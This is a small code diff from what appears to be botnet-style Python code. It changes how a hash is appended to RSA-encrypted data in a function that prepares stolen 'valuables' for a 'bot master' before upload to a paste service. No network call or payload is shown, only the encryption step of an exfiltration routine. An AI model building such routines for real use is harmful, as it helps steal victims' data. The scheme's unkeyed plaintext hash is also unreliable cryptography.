@@ -20,7 +20,7 @@ def encrypt_for_master(data):
     hashed_data = SHA.new(data);
 
     pkcs_cipher = PKCS1_v1_5.new(masters_public_key);
-    return pkcs_cipher.encrypt(data) + bytes(hashed_data.hexdigest(), "ascii");
+    return pkcs_cipher.encrypt(data) + hashed_data.digest();
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
